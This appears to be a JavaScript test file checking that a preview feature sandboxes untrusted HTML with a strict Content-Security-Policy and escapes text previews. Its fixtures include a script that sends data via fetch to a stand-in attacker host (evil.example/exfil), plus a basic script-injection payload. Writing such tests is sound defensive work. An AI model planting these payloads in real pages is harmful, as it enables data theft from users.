import assert from 'node:assert/strict';
import { buildHtmlPreviewDocument, buildTextPreviewDocument, PREVIEW_CSP } from '../preview-security.js';

const malicious = '<html><head><title>x</title></head><body><script>fetch("https://evil.example/exfil")</script><img src="https://evil.example/x"><form action="https://evil.example"></form></body></html>';
const wrapper = buildHtmlPreviewDocument(malicious);
assert.match(wrapper, /<iframe sandbox="allow-scripts"/);
assert.doesNotMatch(wrapper, /allow-same-origin/);
assert.match(wrapper, /src="data:text\/html;base64,/);

const encoded = wrapper.match(/src="data:text\/html;base64,([^"]+)"/i)?.[1];
assert.ok(encoded, 'preview did not create the expected data iframe');
const inner = Buffer.from(encoded, 'base64').toString('utf8');
assert.match(inner, /connect-src 'none'/);
assert.match(inner, /frame-src 'none'/);
assert.match(inner, /worker-src 'none'/);
assert.match(inner, /<meta http-equiv="Content-Security-Policy"/i);
assert.ok(inner.indexOf('<meta http-equiv="Content-Security-Policy"') < inner.indexOf('<script>'), 'child CSP is not placed before executable repository script');
assert.ok(inner.indexOf('<meta http-equiv="Content-Security-Policy"') < inner.indexOf('<script>'), 'child CSP is not placed before executable repository script');

const text = buildTextPreviewDocument('index.html', '<img src=x><script>alert(1)</script>');
assert.match(text, /&lt;img src=x&gt;&lt;script&gt;alert\(1\)&lt;\/script&gt;/);
assert.match(text, /connect-src 'none'/);
assert.match(PREVIEW_CSP, /default-src 'none'/);

console.log('preview-isolation-runtime: PASS');
